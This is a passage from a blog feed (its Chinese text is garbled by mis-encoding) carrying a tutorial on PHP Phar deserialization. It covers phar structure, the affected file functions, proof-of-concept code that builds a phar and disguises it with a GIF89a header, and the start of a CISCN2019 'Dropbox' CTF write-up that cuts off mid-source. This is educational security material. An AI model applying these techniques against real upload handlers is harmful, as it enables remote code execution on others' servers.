      &lt;p&gt;  å…ˆçœ‹åˆ°é¢˜ç›®ç»™å‡ºçš„æºç ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTFé¢˜" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Pharååºåˆ—åŒ–æµ…æ</title>
    <link href="https://www.extrader.top/posts/bb56c28a/"/>
    <id>https://www.extrader.top/posts/bb56c28a/</id>
    <published>2020-05-04T03:49:35.000Z</published>
    <updated>2020-11-08T07:16:22.652Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></li><li><a href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></li></ul><span id="more"></span><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h4 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h4><p><strong>â‘ </strong>  <strong>a stub</strong></p><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p><p><strong>â‘¡</strong>  <strong>a manifest describing the contents</strong></p><p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<code>meta-data</code>ï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>â‘¢</strong>  <strong>the file contents</strong></p><p>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><strong>â‘£</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>é€šè¿‡<code>phar://</code>ä¼ªåè®®å¯¹ä¸€ä¸ª<strong>phar</strong>æ–‡ä»¶è¿›è¡Œäº†æ–‡ä»¶æ“ä½œçš„æ—¶å€™ï¼Œå°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¾¾åˆ°<strong>RCE</strong>çš„æ•ˆæœ</p><h4 id="äº§ç”Ÿç¼˜ç”±"><a href="#äº§ç”Ÿç¼˜ç”±" class="headerlink" title="äº§ç”Ÿç¼˜ç”±"></a>äº§ç”Ÿç¼˜ç”±</h4><p>åœ¨<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>å¤„ï¼Œå…¶è°ƒç”¨äº†<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>å› æ­¤å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„pharåŒ…ï¼Œä½¿å¾—ä»£ç èƒ½å¤Ÿååºåˆ—åŒ–ï¼Œä»è€Œæ„é€ ä¸€ä¸ªpopé“¾ï¼Œåœ¨ä½¿ç”¨<code>phar://</code>åè®®è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¼šè¢«è§£ææˆphar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) çš„è¿‡ç¨‹ä¼šè§¦å‘<code>php_var_unserialize</code>å‡½æ•°å¯¹<strong>meta-data</strong>çš„æ“ä½œï¼Œé€ æˆååºåˆ—åŒ–ã€‚</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><strong>æ¡ä»¶</strong></p><ul><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li></ul><p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„<a href="http://php.net/manual/en/ref.filesystem.php">æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</a>åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>ï¼š<code>exif_thumbnail</code>ï¼Œ<code>exif_imagetype</code></li><li><strong>gd</strong>ï¼š<code>imageloadfont</code>ï¼Œ<code>imagecreatefrom***</code></li><li><strong>hash</strong>ï¼š<code>hash_hmac_file</code>ï¼Œ<code>hash_file</code>ï¼Œ<code>hash_update_file</code>ï¼Œ<code>md5_file</code>ï¼Œ<code>sha1_file</code></li><li><strong>file/url</strong>ï¼š<code>get_meta_tags</code>ï¼Œ<code>get_headers</code></li><li><strong>standard</strong>ï¼š<code>getimagesize</code>ï¼Œ<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é™åˆ¶<code>phar://</code>ä¸èƒ½å‡ºç°åœ¨å¤´å‡ ä¸ªå­—ç¬¦ï¼Œäº¦é€‚ç”¨äº<code>compress.zlib://</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span></code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>pgsqlCopyToFile</code>å’Œ<code>pg_trace</code>åŒæ ·èƒ½ä½¿ç”¨çš„ï¼Œéœ€è¦å¼€å¯<code>phar</code>çš„å†™åŠŸèƒ½ã€‚</p><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>ç”Ÿæˆ<strong>phar</strong>æ–‡ä»¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>    <span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepadæ‰“å¼€æŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>æ˜æ˜¾çš„åºåˆ—åŒ–å­˜å‚¨</p><p>æ„é€ åˆ©ç”¨ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æˆåŠŸæ‰“å°ç»“æœï¼Œå½“ç„¶è¿™é‡Œæ¢å…¶ä»–çš„æ–‡ä»¶æ“ä½œå‡½æ•°ä¹Ÿå¯ä»¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</strong></p><p>åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>    <span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepadæ‰“å¼€æŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>å’Œä¸Šé¢çš„ä¸€æ ·å¯ä»¥åˆ©ç”¨æˆåŠŸ</p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-â€”Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-â€”Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]â€”Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]â€”Dropbox</h4><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ï¼Œéšåå‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½ï¼Œåˆ é™¤æ–‡ä»¶çš„åŠŸèƒ½</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>æµ‹è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ é‚£ä¸‰ç§å›¾ç‰‡çš„æ ¼å¼ï¼Œåº”è¯¥æ˜¯æœ‰ç™½åå•ï¼Œä¸”æ–‡ä»¶ä¸Šä¼ åè·¯å¾„ä¸å¯çŸ¥ï¼Œäºæ˜¯æŠ“åŒ…æµ‹è¯•æ–‡ä»¶ä¸‹è½½å’Œåˆ é™¤åŠŸèƒ½ï¼Œå…¶ä¸­æ–‡ä»¶ä¸‹è½½å¤„å­˜åœ¨æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œäºæ˜¯å°†æ•´ä¸ªç½‘ç«™çš„æºç éƒ½ä¸‹è½½ä¸‹æ¥ï¼Œæµ‹è¯•åå‘ç°ï¼Œåå°åœ¨ä¸‹è½½ç•Œé¢è¿˜æ˜¯åšäº†æƒé™é™åˆ¶çš„ï¼Œä¸ç„¶æ ¹ç›®å½•ä¸‹çš„<code>flag</code>å°±å¯ä»¥ç›´æ¥ä¸‹ä¸‹æ¥äº†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>æœ‰ä»¥ä¸‹æ–‡ä»¶ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('æ³¨å†ŒæˆåŠŸ', 'info');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$u</span><span class="token operator">-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('è´¦å·æˆ–å¯†ç é”™è¯¯', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">-></span><span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='login.php?register';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('æ­¤ç”¨æˆ·åå·²è¢«ä½¿ç”¨', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('è¯·è¾“å…¥æœ‰æ•ˆç”¨æˆ·åå’Œå¯†ç ', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token 